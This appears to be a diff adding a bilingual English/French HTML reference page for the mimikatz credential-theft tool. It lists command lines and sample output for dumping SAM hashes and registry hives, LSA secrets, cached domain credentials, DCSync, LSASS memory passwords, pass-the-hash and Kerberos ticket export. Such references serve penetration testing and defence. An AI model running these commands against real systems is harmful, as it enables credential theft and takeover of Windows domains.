+        <p data-lang-en="Displays information about the TGT of the current session." data-lang-fr="Affiche les infos du TGT de la session."></p>
+        <pre><code>mimikatz # kerberos::tgt</code></pre>
+      
+        <h4 data-lang-en="list" data-lang-fr="list">list</h4>
+        <p data-lang-en="Lists and exports Kerberos tickets (TGT and TGS) of the current session."
+           data-lang-fr="Liste et exporte les tickets Kerberos (TGT/TGS) de la session actuelle."></p>
+        <p><strong data-lang-en="Arguments:" data-lang-fr="Arguments :" ></strong></p>
+        <ul>
+          <li><code>/export</code> – <span data-lang-en="Export tickets to files" data-lang-fr="Exporter les tickets en fichiers"></span></li>
+        </ul>
+        <pre><code>mimikatz # kerberos::list /export</code></pre>
+      
+        <h4 data-lang-en="purge" data-lang-fr="purge">purge</h4>
+        <p data-lang-en="Purges all tickets of the current session." data-lang-fr="Supprime tous les tickets de la session."></p>
+        <pre><code>mimikatz # kerberos::purge</code></pre>
+      </section>
+      <section>
+        <h2 data-lang-en="lsadump" data-lang-fr="lsadump">lsadump</h2>
+        <p data-lang-en="The lsadump module allows extraction of hashes, secrets, cached credentials..."
+           data-lang-fr="Le module lsadump permet d'extraire des hachages, secrets, et identifiants mis en cache...">
+        </p>
+        <ul>
+          <li data-lang-en="Requires SYSTEM privileges for most commands." data-lang-fr="Nécessite les privilèges SYSTEM pour la plupart des commandes."></li>
+          <li data-lang-en="Backup data before offline use." data-lang-fr="Sauvegarder vos données avant usage hors ligne."></li>
+          <li data-lang-en="Use responsibly and ethically." data-lang-fr="Utilisation légale et éthique obligatoire."></li>
+        </ul>
+      
+        <h3 data-lang-en="Commands" data-lang-fr="Commandes">Commands</h3>
+        <ul>
+          <li>sam</li><li>secrets</li><li>cache</li><li>lsa</li><li>trust</li><li>backupkeys</li><li>rpdata</li><li>dcsync</li><li>netsync</li>
+        </ul>
+      
+        <h4 data-lang-en="sam (Online Mode)" data-lang-fr="sam (Mode en ligne)">sam (Online Mode)</h4>
+        <p data-lang-en="Dumps the SAM database, including NTLM hashes." data-lang-fr="Extrait la base SAM, incluant les hachages NTLM."></p>
+        <p data-lang-en="Requires SYSTEM privileges." data-lang-fr="Nécessite les privilèges SYSTEM."></p>
+        <pre><code>mimikatz # lsadump::sam</code></pre>
+      
+        <h4 data-lang-en="Elevating Privileges" data-lang-fr="Élévation de privilèges">Elevating Privileges</h4>
+        <pre><code>mimikatz # privilege::debug
+      mimikatz # token::whoami
+      mimikatz # token::elevate</code></pre>
+      
+        <h4 data-lang-en="Running the Command Again" data-lang-fr="Relancer la commande">Running Again</h4>
+        <pre><code>mimikatz # lsadump::sam</code></pre>
+      
+        <h4 data-lang-en="Example Output" data-lang-fr="Exemple de sortie">Output</h4>
+        <pre><code>Domain : VM-W7-ULT-X
+      SysKey : 74c159e4488119a0ba39a7872e9d9a56
+      SAMKey : e44ddd44f07ebfe800edf6c11d4abd
+      
+      RID : 000001f4 (500)
+      User : Administrateur
+      NTLM : 316dcf...c089c0
+      ...</code></pre>
+      </section>
+      <section>
+        <h4 data-lang-en="Offline Mode" data-lang-fr="Mode hors ligne">Offline Mode</h4>
+        <p data-lang-en="You need SYSTEM and SAM hive files." data-lang-fr="Vous devez avoir les fichiers SYSTEM et SAM."></p>
+        <pre><code>reg save HKLM\\SYSTEM SystemBkup.hiv
+      reg save HKLM\\SAM SamBkup.hiv</code></pre>
+        <p><strong>Or:</strong></p>
+        <ul>
+          <li>C:\\Windows\\System32\\config\\SYSTEM</li>
+          <li>C:\\Windows\\System32\\config\\SAM</li>
+        </ul>
+        <pre><code>mimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv</code></pre>
+      
+        <h4 data-lang-en="secrets" data-lang-fr="secrets">secrets</h4>
+        <p data-lang-en="Extracts LSA secrets (e.g., service passwords)." data-lang-fr="Extrait les secrets LSA (ex. : mots de passe services)."></p>
+        <pre><code>mimikatz # lsadump::secrets</code></pre>
+      </section>
+      <section>
+        <h4 data-lang-en="cache" data-lang-fr="cache">cache</h4>
+        <p data-lang-en="Dumps cached domain credentials stored in LSA." data-lang-fr="Extrait les identifiants de domaine mis en cache dans LSA."></p>
+        <pre><code>mimikatz # lsadump::cache</code></pre>
+      </section>
+      <section>
+        <h3 data-lang-en="lsa" data-lang-fr="lsa">lsa</h3>
+        <p data-lang-en="Dumps user information from the LSA database (NTLM, Kerberos)." data-lang-fr="Extrait les infos utilisateurs de la base LSA (NTLM, Kerberos)."></p>
+        <pre><code>mimikatz # lsadump::lsa /id:500</code></pre>
+        <p><strong data-lang-en="With Inject:" data-lang-fr="Avec injection :"></strong></p>
+        <pre><code>mimikatz # lsadump::lsa /inject /name:krbtgt</code></pre>
+        <p><strong data-lang-en="With Patch:" data-lang-fr="Avec patch :"></strong></p>
+        <pre><code>mimikatz # lsadump::lsa /patch</code></pre>
+      
+        <h3 data-lang-en="dcsync" data-lang-fr="dcsync">dcsync</h3>
+        <p data-lang-en="Simulates a domain controller to sync user secrets via DRSR." data-lang-fr="Simule un contrôleur de domaine pour synchroniser les secrets via DRSR."></p>
+        <pre><code>mimikatz # lsadump::dcsync /domain:chocolate.local /user:Administrator</code></pre>
+      </section>
+      <section>
+        <h2 data-lang-en="sekurlsa" data-lang-fr="sekurlsa">sekurlsa</h2>
+        <p data-lang-en="Extracts passwords, keys, and tickets from LSASS memory." data-lang-fr="Extrait les mots de passe, clés, et tickets de la mémoire LSASS."></p>
+      
+        <h4 data-lang-en="Requirements" data-lang-fr="Pré-requis">Requirements</h4>
+        <ol>
+          <li><code>privilege::debug</code> (admin)</li>
+          <li><code>SYSTEM</code> via psexec, scheduled task, etc.</li>
+        </ol>
+      
+        <h4 data-lang-en="Initial Setup" data-lang-fr="Configuration initiale">Initial Setup</h4>
+        <pre><code>mimikatz # privilege::debug
+      mimikatz # log sekurlsa.log</code></pre>
+      
+        <h4 data-lang-en="Commands and Usage" data-lang-fr="Commandes et usage">Commands and Usage</h4>
+        <pre><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+      
+        <h4 data-lang-en="Output Example" data-lang-fr="Exemple de sortie">Example output:</h4>
+        <pre><code>Username : Gentil Kiwi
+      NTLM     : cc36cf7a8514893efccd332446158b1a
+      ...
+      kerberos : Password : waza1234/
+      credman  : Password : anotherpassword</code></pre>
+      </section>
+      <section>
+        <h4 data-lang-en="Pass-The-Hash (pth)" data-lang-fr="Pass-The-Hash (pth)">Pass-The-Hash</h4>
+        <p data-lang-en="Runs a process under another credential using an NTLM hash."
+           data-lang-fr="Exécute un processus sous une autre identité avec un hash NTLM."></p>
+        <pre><code>mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</code></pre>
+      
+        <h4 data-lang-en="tickets" data-lang-fr="tickets">tickets</h4>
+        <p data-lang-en="Lists and exports Kerberos tickets from all sessions." data-lang-fr="Liste et exporte tous les tickets Kerberos."></p>
+        <pre><code>mimikatz # sekurlsa::tickets /export</code></pre>
+      </section>
+      <section>
+        <h4 data-lang-en="ekeys" data-lang-fr="ekeys">ekeys</h4>
+        <p data-lang-en="Extracts encryption keys." data-lang-fr="Extrait les clés de chiffrement."></p>
+        <pre><code>mimikatz # sekurlsa::ekeys</code></pre>
+      
+        <h4 data-lang-en="dpapi" data-lang-fr="dpapi">dpapi</h4>
+        <p data-lang-en="Extracts DPAPI keys." data-lang-fr="Extrait les clés DPAPI."></p>
+        <pre><code>mimikatz # sekurlsa::dpapi</code></pre>
+      
+        <h4 data-lang-en="minidump" data-lang-fr="minidump">minidump</h4>
+        <p data-lang-en="Loads an LSASS minidump for offline analysis." data-lang-fr="Charge un minidump LSASS pour analyse hors ligne."></p>
+        <pre><code>mimikatz # sekurlsa::minidump lsass.dmp</code></pre>
+      
+        <ul>
+          <li><strong>process</strong>: context switch</li>
+          <li><strong>searchpasswords</strong>: find passwords</li>
+          <li><strong>msv</strong>: MSV credentials</li>
+          <li><strong>wdigest</strong>: WDigest credentials</li>
+          <li><strong>kerberos</strong>: Kerberos credentials</li>
+        </ul>
+      
+        <p data-lang-en="Example: extracting from minidump" data-lang-fr="Exemple : extraction depuis minidump"></p>
+        <pre><code>mimikatz # sekurlsa::minidump lsass.dmp
+      mimikatz # sekurlsa::logonpasswords</code></pre>
+      
+        <p data-lang-en="Note: on Windows 8.x+, credentials are not always in memory." data-lang-fr="Note : sous Windows 8+, les mots de passe ne sont pas toujours en mémoire."></p>
+      </section>
+      
+  </div>
+  <footer>
+    <p>&copy; 2025 By zзd – All rights reserved</p>
+  </footer>
+</body>
+</html>
